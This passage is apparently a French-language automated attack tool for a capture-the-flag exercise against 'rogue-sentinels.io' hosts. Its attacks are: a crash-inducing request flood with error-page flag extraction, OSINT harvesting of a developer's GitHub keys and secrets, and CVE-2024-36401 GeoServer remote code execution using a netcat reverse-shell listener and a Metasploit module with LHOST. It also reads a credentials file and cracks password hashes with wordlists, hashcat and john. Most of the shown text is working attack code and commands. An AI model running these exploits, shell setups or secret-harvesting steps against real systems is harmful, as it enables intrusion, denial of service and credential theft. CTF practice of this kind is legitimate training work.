# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# VULNÃ‰RABILITÃ‰ #3: Restricted - DoS + Info Disclosure
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

class Exploit3_Restricted:
    """
    Exploitation de Restricted via Fuzzing:
    1. Fuzzing exhaustif (x,y,z) jusqu'au crash
    2. RÃ©cupÃ©ration de la page d'erreur
    3. DÃ©codage Base64 du flag
    """
    
    def __init__(self):
        self.session = requests.Session()
        self.base_url = None
        
    def run(self):
        clear_screen()
        print_section("EXPLOIT #3: Restricted - DoS + Information Disclosure")
        
        # Configuration
        host = input(f"{Colors.CYAN}Host (dÃ©faut: restricted.rogue-sentinels.io): {Colors.ENDC}") or "restricted.rogue-sentinels.io"
        port = input(f"{Colors.CYAN}Port (dÃ©faut: 64375): {Colors.ENDC}") or "64375"
        self.base_url = f"http://{host}:{port}"
        
        print_info(f"Cible: {self.base_url}")
        
        # Ã‰tape 1: Reconnaissance
        print_info("\n[Ã‰tape 1] Reconnaissance...")
        self.recon()
        
        # Ã‰tape 2: Fuzzing exhaustif
        print_info("\n[Ã‰tape 2] Fuzzing exhaustif (x,y,z)...")
        crash_value = self.exhaustive_fuzzing()
        
        if crash_value:
            # Ã‰tape 3: DÃ©clencher le crash et rÃ©cupÃ©rer le flag
            print_info("\n[Ã‰tape 3] Exploitation du crash...")
            flag = self.exploit_crash(crash_value)
            
            if flag:
                print_flag(flag)
                pause()
                return flag
        
        pause()
        return None
    
    def recon(self):
        """Reconnaissance de l'application"""
        try:
            r = self.session.get(self.base_url, timeout=10)
            print_success(f"Application accessible (Status: {r.status_code})")
            
            if 'adder' in r.text.lower() or 'calculator' in r.text.lower():
                print_info("Application: Ultimate Adder (Calculator)")
            
            # Tester l'endpoint /calculate avec une requÃªte normale
            test_r = self.session.get(f"{self.base_url}/calculate", params={'x': 1, 'y': 1, 'z': 1}, timeout=5)
            if test_r.status_code == 200:
                print_success(f"Endpoint /calculate fonctionne (1+1+1 = {test_r.text.strip()})")
                
        except Exception as e:
            print_error(f"Erreur: {e}")
    
    def exhaustive_fuzzing(self):
        """Fuzzing exhaustif: teste (0,0,0), (0,0,1), ..., jusqu'au crash"""
        
        print_info("MÃ©thode de fuzzing:")
        print("  [1] Fuzzing exhaustif (0,0,0 â†’ 0,0,1 â†’ ... lent mais complet)")
        print("  [2] Test de la valeur connue (42069)")
        print("  [3] Entrer une valeur manuellement")
        
        mode = input(f"{Colors.CYAN}Choix (1/2/3): {Colors.ENDC}") or "2"
        
        if mode == "2":
            # Test direct avec somme = 42069
            print_info("Test avec somme = 42069 (x=0, y=0, z=42069)...")
            try:
                r = self.session.post(
                    f"{self.base_url}/calculate",
                    data={'x': 0, 'y': 0, 'z': 42069},
                    timeout=5
                )
                if r.status_code >= 500:
                    print_success(f"Crash confirmÃ©! (Status {r.status_code})")
                    print_success(f"Somme = 0 + 0 + 42069 = 42069")
                    return (0, 0, 42069)
                else:
                    print_info(f"Status {r.status_code} - envoi de requÃªtes supplÃ©mentaires...")
                    # Parfois il faut plusieurs requÃªtes pour crasher
                    for i in range(10):
                        try:
                            r2 = self.session.post(
                                f"{self.base_url}/calculate",
                                data={'x': 0, 'y': 0, 'z': 42069},
                                timeout=5
                            )
                            if r2.status_code >= 500:
                                print_success(f"Crash aprÃ¨s {i+2} requÃªtes!")
                                return (0, 0, 42069)
                        except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
                            print_success(f"Serveur crashÃ© aprÃ¨s {i+2} requÃªtes!")
                            return (0, 0, 42069)
                    
                    print_warning("Pas de crash immÃ©diat...")
                    
            except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
                print_success("Crash confirmÃ©! (Timeout/Connection Error)")
                return (0, 0, 42069)
            except Exception as e:
                print_warning(f"Erreur: {e}")
            
            # Demander si on veut continuer
            cont = input(f"{Colors.YELLOW}Utiliser quand mÃªme (0,0,42069)? (o/n): {Colors.ENDC}")
            if cont.lower() == 'o':
                return (0, 0, 42069)
            mode = "1"
        
        if mode == "3":
            x = int(input(f"{Colors.YELLOW}Valeur x: {Colors.ENDC}") or "42069")
            y = int(input(f"{Colors.YELLOW}Valeur y: {Colors.ENDC}") or "0")
            z = int(input(f"{Colors.YELLOW}Valeur z: {Colors.ENDC}") or "0")
            return (x, y, z)
        
        if mode == "1":
            # Fuzzing exhaustif - incrÃ©mente la somme progressivement
            print_info("DÃ©marrage du fuzzing exhaustif...")
            print_info("Le crash arrive quand x + y + z = valeur magique")
            print_info("Test: (0,0,0)â†’(0,0,1)â†’(0,0,2)â†’...â†’(0,0,N)â†’(0,1,0)â†’...")
            print_warning("Ctrl+C pour arrÃªter.")
            print()
            
            tested = 0
            max_val = 50000  # Limite pour chaque variable
            
            try:
                # MÃ©thode 1: Tester z seul d'abord (x=0, y=0, z=0â†’max)
                # C'est la mÃ©thode la plus rapide pour atteindre 42069
                print_info("Phase 1: Test avec z seul (x=0, y=0, z=0â†’50000)...")
                
                for z in range(0, max_val):
                    tested += 1
                    
                    if z % 1000 == 0:
                        print(f"  z={z} (somme={z})...", end='\r')
                    
                    if self.test_crash(0, 0, z):
                        print()
                        print_success(f"CRASH TROUVÃ‰! x=0, y=0, z={z}")
                        print_success(f"Somme = 0 + 0 + {z} = {z}")
                        return (0, 0, z)
                
                print()
                print_info("Phase 2: Test exhaustif complet...")
                
                # MÃ©thode 2: Tester toutes les combinaisons par somme croissante
                for target_sum in range(0, 100000):
                    # GÃ©nÃ©rer des combinaisons qui donnent cette somme
                    # On teste juste quelques combinaisons par somme pour aller vite
                    test_cases = [
                        (target_sum, 0, 0),
                        (0, target_sum, 0),
                        (0, 0, target_sum),
                        (target_sum // 2, target_sum - target_sum // 2, 0),
                        (target_sum // 3, target_sum // 3, target_sum - 2 * (target_sum // 3)),
                    ]
                    
                    for x, y, z in test_cases:
                        if x > 999999 or y > 999999 or z > 999999:
                            continue
                        if x < 0 or y < 0 or z < 0:
                            continue
                            
                        tested += 1
                        
                        if self.test_crash(x, y, z):
                            print()
                            print_success(f"CRASH TROUVÃ‰! x={x}, y={y}, z={z}")
                            print_success(f"Somme = {x} + {y} + {z} = {x+y+z}")
                            return (x, y, z)
                    
                    if target_sum % 5000 == 0:
                        print(f"  Somme testÃ©e: {target_sum}...", end='\r')
                        
            except KeyboardInterrupt:
                print(f"\n{Colors.YELLOW}Fuzzing interrompu{Colors.ENDC}")
                
                manual = input(f"{Colors.YELLOW}Entrer les valeurs manuellement? (o/n): {Colors.ENDC}")
                if manual.lower() == 'o':
                    x = int(input(f"{Colors.YELLOW}x: {Colors.ENDC}") or "0")
                    y = int(input(f"{Colors.YELLOW}y: {Colors.ENDC}") or "0")
                    z = int(input(f"{Colors.YELLOW}z: {Colors.ENDC}") or "42069")
                    return (x, y, z)
        
        return None
    
    def test_crash(self, x, y, z):
        """Tester si une combinaison cause un crash"""
        try:
            r = self.session.post(
                f"{self.base_url}/calculate",
                data={'x': x, 'y': y, 'z': z},
                timeout=5
            )
            # Status 200 = PAS de crash, le serveur fonctionne normalement
            # Crash = 500, 502, 503, 504 ou timeout/connection error
            if r.status_code == 200:
                return False  # Pas de crash
            elif r.status_code >= 500:
                print_info(f"  Status {r.status_code} pour ({x},{y},{z})")
                return True  # Crash serveur
            else:
                return False  # Autre status (404, etc.) pas un crash
                
        except requests.exceptions.Timeout:
            print_info(f"  TIMEOUT pour ({x},{y},{z}) - Serveur ne rÃ©pond plus!")
            return True  # Timeout = serveur crashÃ©
        except requests.exceptions.ConnectionError:
            print_info(f"  CONNECTION ERROR pour ({x},{y},{z}) - Serveur down!")
            return True  # Connection error = serveur crashÃ©
        except Exception as e:
            return False
    
    def exploit_crash(self, crash_value):
        """DÃ©clencher le crash et rÃ©cupÃ©rer le flag"""
        
        x, y, z = crash_value
        
        # Ã‰tape 1: DÃ©clencher le crash (peut nÃ©cessiter plusieurs requÃªtes)
        print_info(f"DÃ©clenchement du crash avec x={x}, y={y}, z={z}...")
        
        for i in range(10):
            try:
                self.session.post(
                    f"{self.base_url}/calculate",
                    data={'x': x, 'y': y, 'z': z},
                    timeout=3
                )
            except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
                print_success(f"Serveur crashÃ© aprÃ¨s {i+1} requÃªte(s)!")
                break
            except:
                pass
        
        # Ã‰tape 2: Attendre que la page d'erreur s'affiche
        print_info("Attente de la page d'erreur...")
        time.sleep(2)
        
        # Ã‰tape 3: RÃ©cupÃ©rer la page principale (qui devrait afficher l'erreur)
        print_info("RÃ©cupÃ©ration de la page d'erreur (GET sur /)...")
        
        # Utiliser une nouvelle session pour Ã©viter les problÃ¨mes de connexion
        new_session = requests.Session()
        
        try:
            r = new_session.get(self.base_url, timeout=10)
            error_content = r.text
            
            print_info(f"Status: {r.status_code}")
            print_info(f"Longueur rÃ©ponse: {len(error_content)} caractÃ¨res")
            
            # Afficher le contenu complet
            print_info("\n" + "="*60)
            print_info("CONTENU DE LA PAGE D'ERREUR:")
            print("="*60)
            print(error_content)
            print("="*60 + "\n")
            
            # Chercher des chaÃ®nes Base64 (caractÃ©ristique: finit par = ou ==)
            # Pattern amÃ©liorÃ© pour trouver les chaÃ®nes dans le JS/HTML
            b64_patterns = [
                r"'([A-Za-z0-9+/]{10,}={1,2})'",   # Entre quotes simples
                r'"([A-Za-z0-9+/]{10,}={1,2})"',   # Entre quotes doubles
                r': ([A-Za-z0-9+/]{10,}={1,2})',   # AprÃ¨s deux-points
                r'([A-Za-z0-9+/]{20,}={1,2})',     # Pattern gÃ©nÃ©ral long
            ]
            
            all_matches = []
            for pattern in b64_patterns:
                matches = re.findall(pattern, error_content)
                all_matches.extend(matches)
            
            # DÃ©dupliquer
            all_matches = list(set(all_matches))
            
            if all_matches:
                print_success(f"TrouvÃ© {len(all_matches)} chaÃ®ne(s) Base64 potentielle(s):")
                
                for i, b64 in enumerate(all_matches):
                    print(f"\n  [{i+1}] {b64}")
                    
                    try:
                        decoded = base64.b64decode(b64).decode('utf-8', errors='ignore')
                        print_success(f"      DÃ©codÃ©: {decoded}")
                        
                        # Chercher un flag
                        if 'flag' in decoded.lower() or 'FLAG' in decoded:
                            flag_match = re.search(r'FLAG[_\-\w]+', decoded, re.I)
                            if flag_match:
                                return flag_match.group(0)
                            return decoded.strip()
                            
                    except Exception as e:
                        print_warning(f"      Erreur dÃ©codage: {e}")
            
            # Si pas trouvÃ© automatiquement
            print_warning("\nAucun flag dÃ©codÃ© automatiquement.")
            print_info("Cherchez une chaÃ®ne suspecte qui se termine par '==' dans la page")
            print_info("Exemple: RkxBR19zb21ldGhpbmc9PQ==")
            
        except Exception as e:
            print_error(f"Erreur rÃ©cupÃ©ration page: {e}")
            print_info("Le serveur est peut-Ãªtre encore down...")
        
        # Demander manuellement
        b64_manual = input(f"\n{Colors.YELLOW}ChaÃ®ne Base64 Ã  dÃ©coder (copier-coller): {Colors.ENDC}")
        
        if b64_manual:
            try:
                decoded = base64.b64decode(b64_manual).decode('utf-8')
                print_success(f"DÃ©codÃ©: {decoded}")
                return decoded.strip()
            except Exception as e:
                print_error(f"Erreur dÃ©codage: {e}")
        
        return None


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# VULNÃ‰RABILITÃ‰ #4: Staging (Liberty) - OSINT
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

class Exploit4_Staging:
    """
    Exploitation OSINT de Staging:
    1. Analyse du code source
    2. Recherche du dÃ©veloppeur (LinkedIn)
    3. Exploration GitHub
    4. RÃ©cupÃ©ration du certificat/secrets
    """
    
    def __init__(self):
        self.session = requests.Session()
        self.base_url = None
        
    def run(self):
        clear_screen()
        print_section("EXPLOIT #4: Staging (Liberty) - OSINT")
        
        # Configuration
        host = input(f"{Colors.CYAN}Host (dÃ©faut: staging.rogue-sentinels.io): {Colors.ENDC}") or "staging.rogue-sentinels.io"
        port = input(f"{Colors.CYAN}Port (dÃ©faut: 19480): {Colors.ENDC}") or "19480"
        self.base_url = f"http://{host}:{port}"
        
        print_info(f"Cible: {self.base_url}")
        
        # Ã‰tape 1: Analyse du code source
        print_info("\n[Ã‰tape 1] Analyse du code source...")
        dev_info = self.analyze_source()
        
        # Ã‰tape 2: Instructions OSINT
        print_info("\n[Ã‰tape 2] Recherche OSINT...")
        self.osint_instructions(dev_info)
        
        # Ã‰tape 3: Exploration GitHub
        print_info("\n[Ã‰tape 3] Exploration GitHub...")
        flag = self.explore_github()
        
        if flag:
            print_flag(flag)
        
        pause()
        return flag
    
    def analyze_source(self):
        """Analyser le code source de la page"""
        
        dev_info = {}
        
        try:
            r = self.session.get(self.base_url, timeout=10)
            
            print_success("Page accessible")
            
            # Chercher les scripts JS
            scripts = re.findall(r'src=["\']([^"\']+\.js)["\']', r.text)
            
            for script in scripts:
                print_info(f"Script trouvÃ©: {script}")
                
                # TÃ©lÃ©charger le script
                if not script.startswith('http'):
                    script_url = f"{self.base_url}/{script.lstrip('/')}"
                else:
                    script_url = script
                
                try:
                    js_r = self.session.get(script_url, timeout=5)
                    js_content = js_r.text
                    
                    # Chercher des noms/auteurs
                    authors = re.findall(r'(?:Author|By|Created by|Auteur)[\s:]+([^\n\*]+)', js_content, re.I)
                    for author in authors:
                        author = author.strip()
                        print_success(f"Auteur trouvÃ©: {author}")
                        dev_info['author'] = author
                    
                    # Afficher le contenu pertinent
                    print_info(f"\nContenu du script:")
                    print(js_content[:800])
                    
                except:
                    pass
            
            # Chercher dans les commentaires HTML
            comments = re.findall(r'<!--(.+?)-->', r.text, re.DOTALL)
            for comment in comments:
                print_info(f"Commentaire: {comment.strip()[:100]}")
            
            # Conseil pour la console
            print_warning("\nâš ï¸  VÃ©rifiez aussi la console du navigateur (F12 > Console)")
            
        except Exception as e:
            print_error(f"Erreur: {e}")
        
        return dev_info
    
    def osint_instructions(self, dev_info):
        """Afficher les instructions OSINT"""
        
        author = dev_info.get('author', '')
        
        print_info("\n=== RECHERCHE OSINT MANUELLE ===")
        print()
        print("1. Recherchez l'auteur sur LinkedIn:")
        if author:
            print(f"   {Colors.CYAN}https://www.linkedin.com/search/results/all/?keywords={quote(author)}{Colors.ENDC}")
        else:
            print(f"   {Colors.YELLOW}Entrez le nom de l'auteur trouvÃ© dans le code source{Colors.ENDC}")
        
        print()
        print("2. Sur le profil LinkedIn, cherchez:")
        print("   - Lien vers GitHub/GitLab")
        print("   - Nom d'utilisateur sur les rÃ©seaux")
        print("   - Entreprise actuelle (Liberty Travel Planners?)")
        
        print()
        print("3. Sur GitHub, cherchez:")
        print("   - Repositories publics")
        print("   - Fichiers sensibles (.crt, .key, secrets)")
        print("   - Historique des commits")
        
        print()
    
    def explore_github(self):
        """Explorer GitHub"""
        
        github_user = input(f"{Colors.YELLOW}Username GitHub trouvÃ©: {Colors.ENDC}")
        
        if not github_user:
            return None
        
        print_info(f"Exploration de github.com/{github_user}...")
        
        # Lister les repos
        try:
            r = self.session.get(f"https://api.github.com/users/{github_user}/repos", timeout=10)
            
            if r.status_code == 200:
                repos = r.json()
                print_success(f"{len(repos)} repositories trouvÃ©s")
                
                for repo in repos:
                    repo_name = repo['name']
                    print_info(f"  - {repo_name}")
                    
                    # Explorer les fichiers
                    files_r = self.session.get(
                        f"https://api.github.com/repos/{github_user}/{repo_name}/contents",
                        timeout=10
                    )
                    
                    if files_r.status_code == 200:
                        files = files_r.json()
                        
                        for f in files:
                            name = f['name']
                            
                            # Fichiers suspects
                            if any(ext in name.lower() for ext in ['.crt', '.key', '.pem', 'secret', 'credential', 'flag']):
                                print_warning(f"    âš ï¸ Fichier suspect: {name}")
                                
                                # TÃ©lÃ©charger le contenu
                                raw_url = f"https://raw.githubusercontent.com/{github_user}/{repo_name}/main/{name}"
                                try:
                                    content_r = self.session.get(raw_url, timeout=5)
                                    if content_r.status_code == 200:
                                        content = content_r.text
                                        print_info(f"    Contenu:\n{content[:500]}")
                                        
                                        # Chercher un flag
                                        flag_match = re.search(r'FLAG[_\-\w]+', content, re.I)
                                        if flag_match:
                                            return flag_match.group(0)
                                except:
                                    pass
        except Exception as e:
            print_error(f"Erreur API GitHub: {e}")
        
        # Demander manuellement
        flag = input(f"{Colors.YELLOW}Flag trouvÃ© manuellement: {Colors.ENDC}")
        return flag if flag else None


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# VULNÃ‰RABILITÃ‰ #5: WebServices - CVE-2024-36401 GeoServer
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

class Exploit5_WebServices:
    """
    Exploitation CVE-2024-36401 sur GeoServer:
    1. Identification de la version
    2. Exploitation RCE
    3. RÃ©cupÃ©ration des credentials
    4. Crack du hash
    """
    
    def __init__(self):
        self.session = requests.Session()
        self.base_url = None
        
    def run(self):
        clear_screen()
        print_section("EXPLOIT #5: WebServices - CVE-2024-36401 GeoServer RCE")
        
        # Configuration
        host = input(f"{Colors.CYAN}Host (dÃ©faut: webservices.rogue-sentinels.io): {Colors.ENDC}") or "webservices.rogue-sentinels.io"
        port = input(f"{Colors.CYAN}Port (dÃ©faut: 8080): {Colors.ENDC}") or "8080"
        self.base_url = f"http://{host}:{port}"
        
        print_info(f"Cible: {self.base_url}")
        
        # Ã‰tape 1: Reconnaissance
        print_info("\n[Ã‰tape 1] Reconnaissance de GeoServer...")
        self.recon()
        
        # Ã‰tape 2: Instructions d'exploitation
        print_info("\n[Ã‰tape 2] Exploitation CVE-2024-36401...")
        self.exploit_instructions()
        
        # Ã‰tape 3: RÃ©cupÃ©ration des credentials
        print_info("\n[Ã‰tape 3] RÃ©cupÃ©ration des credentials...")
        creds = self.get_credentials()
        
        # Ã‰tape 4: Crack du hash
        print_info("\n[Ã‰tape 4] Crack du hash...")
        password = self.crack_hash(creds)
        
        if password:
            flag = f"admin:{password}"
            print_flag(flag)
            return flag
        
        pause()
        return None
    
    def recon(self):
        """Reconnaissance de GeoServer"""
        
        paths = ['/geoserver', '/geoserver/web', '/geoserver/web/', '/']
        
        for path in paths:
            try:
                r = self.session.get(f"{self.base_url}{path}", timeout=10)
                
                if 'geoserver' in r.text.lower():
                    print_success(f"GeoServer dÃ©tectÃ©: {path}")
                    
                    # Version
                    version_match = re.search(r'GeoServer\s*([\d\.]+)', r.text)
                    if version_match:
                        print_success(f"Version: {version_match.group(1)}")
                    
                    return True
            except:
                pass
        
        print_warning("GeoServer non dÃ©tectÃ© automatiquement")
        return False
    
    def exploit_instructions(self):
        """Afficher les instructions d'exploitation"""
        
        lhost = input(f"{Colors.YELLOW}Votre IP (LHOST): {Colors.ENDC}")
        
        print_info("\n=== MÃ‰THODE 1: Script Python ===")
        print()
        print("1. Cloner l'exploit:")
        print(f"   {Colors.CYAN}git clone https://github.com/jakabakos/CVE-2024-36401-GeoServer-RCE{Colors.ENDC}")
        print()
        print("2. Lancer un listener:")
        print(f"   {Colors.CYAN}nc -lvnp 1337{Colors.ENDC}")
        print()
        print("3. ExÃ©cuter l'exploit:")
        print(f"   {Colors.CYAN}python3 exploit.py -u {self.base_url} -ip {lhost} -rp 1337{Colors.ENDC}")
        
        print_info("\n=== MÃ‰THODE 2: Metasploit ===")
        print()
        print(f"   {Colors.CYAN}msfconsole{Colors.ENDC}")
        print(f"   {Colors.CYAN}use exploit/multi/http/geoserver_eval_injection{Colors.ENDC}")
        print(f"   {Colors.CYAN}set RHOSTS webservices.rogue-sentinels.io{Colors.ENDC}")
        print(f"   {Colors.CYAN}set RPORT 8080{Colors.ENDC}")
        print(f"   {Colors.CYAN}set LHOST {lhost}{Colors.ENDC}")
        print(f"   {Colors.CYAN}set LPORT 1337{Colors.ENDC}")
        print(f"   {Colors.CYAN}exploit{Colors.ENDC}")
        
        print()
        input(f"{Colors.YELLOW}Appuyez sur EntrÃ©e une fois le shell obtenu...{Colors.ENDC}")
    
    def get_credentials(self):
        """RÃ©cupÃ©rer les credentials"""
        
        print_info("Dans le shell, exÃ©cutez:")
        print(f"   {Colors.CYAN}ls -la{Colors.ENDC}")
        print(f"   {Colors.CYAN}cat ADMIN_CREDENTIALS.txt{Colors.ENDC}")
        print()
        
        username = input(f"{Colors.YELLOW}Username: {Colors.ENDC}") or "admin"
        password_hash = input(f"{Colors.YELLOW}Hash du password: {Colors.ENDC}")
        
        return {'username': username, 'hash': password_hash}
    
    def crack_hash(self, creds):
        """Cracker le hash"""
        
        password_hash = creds.get('hash', '')
        
        if not password_hash:
            return None
        
        print_info(f"Hash: {password_hash}")
        print_info(f"Longueur: {len(password_hash)} caractÃ¨res")
        
        # Identifier le type
        if len(password_hash) == 64:
            hash_type = "sha256"
            hashcat_mode = "1400"
        elif len(password_hash) == 32:
            hash_type = "md5"
            hashcat_mode = "0"
        else:
            hash_type = "unknown"
            hashcat_mode = "0"
        
        print_info(f"Type probable: {hash_type}")
        
        # Crack basique
        print_info("\nTentative de crack avec wordlist basique...")
        
        import hashlib
        
        # Mots de passe courants + variations Batman (hint du CTF)
        passwords = COMMON_PASSWORDS + [
            "batman", "Batman", "batman1984", "Batman1984", 
            "batman1986", "Batman1986", "batman123", "Batman123",
            "gotham", "joker", "robin", "alfred", "wayne", "bruce"
        ]
        
        for pwd in passwords:
            if hash_type == "sha256":
                test_hash = hashlib.sha256(pwd.encode()).hexdigest()
            elif hash_type == "md5":
                test_hash = hashlib.md5(pwd.encode()).hexdigest()
            else:
                continue
            
            if test_hash == password_hash:
                print_success(f"Mot de passe trouvÃ©: {pwd}")
                return pwd
        
        # Instructions pour crack avancÃ©
        print_info("\n=== Crack avec Hashcat ===")
        print(f"   {Colors.CYAN}echo '{password_hash}' > hash.txt{Colors.ENDC}")
        print(f"   {Colors.CYAN}hashcat -m {hashcat_mode} -a 0 hash.txt rockyou.txt{Colors.ENDC}")
        
        print_info("\n=== Crack avec John ===")
        print(f"   {Colors.CYAN}echo '{password_hash}' > hash.txt{Colors.ENDC}")
        print(f"   {Colors.CYAN}john --format=raw-{hash_type} --wordlist=rockyou.txt hash.txt{Colors.ENDC}")
        
        password = input(f"\n{Colors.YELLOW}Mot de passe crackÃ©: {Colors.ENDC}")
        return password if password else None


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# MENU PRINCIPAL
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

def main_menu():
    """Menu principal"""
    
    captured_flags = {}
    
    while True:
        clear_screen()
        banner()
        
        print(f"\n{Colors.BOLD}  MENU PRINCIPAL{Colors.ENDC}\n")
        
        print("  [0] Reconnaissance complÃ¨te (DNS, Ports, Services)")
        print()
        
        exploits = {
            1: ("FileServer - Bruteforce + ZIP Cracking", Exploit1_FileServer),
            2: ("Travel - File Upload RCE", Exploit2_Travel),
            3: ("Restricted - DoS + Info Disclosure", Exploit3_Restricted),
            4: ("Staging (Liberty) - OSINT", Exploit4_Staging),
            5: ("WebServices - CVE-2024-36401 RCE", Exploit5_WebServices),
        }
        
        for num, (name, _) in exploits.items():
            status = f"{Colors.GREEN}âœ“{Colors.ENDC}" if num in captured_flags else " "
            print(f"  [{status}] [{num}] {name}")
            if num in captured_flags:
                print(f"        â†’ {Colors.YELLOW}{captured_flags[num]}{Colors.ENDC}")
        
        print()
        print(f"  [6] Afficher tous les flags")
        print(f"  [9] Quitter")
        print()
        
        try:
            choice = input(f"  {Colors.CYAN}Choix: {Colors.ENDC}")
            choice = int(choice)
            
            if choice == 9:
                print_info("\nAu revoir!")
                break
            elif choice == 0:
                recon = Reconnaissance()
                recon.run_full_recon()
                pause()
            elif choice in exploits:
                exploit_class = exploits[choice][1]
                exploit = exploit_class()
                flag = exploit.run()
                if flag:
                    captured_flags[choice] = flag
            elif choice == 6:
                clear_screen()
                print_section("FLAGS CAPTURÃ‰S")
                if captured_flags:
                    for num, flag in sorted(captured_flags.items()):
                        print(f"  [{num}] {Colors.GREEN}{flag}{Colors.ENDC}")
                else:
                    print_warning("Aucun flag capturÃ©")
                pause()
                
        except ValueError:
            pass
        except KeyboardInterrupt:
            print_info("\n\nInterruption.")
            break


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# POINT D'ENTRÃ‰E
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

if __name__ == "__main__":
    try:
        main_menu()
    except KeyboardInterrupt:
        print_info("\n\nInterruption.")
        sys.exit(0)
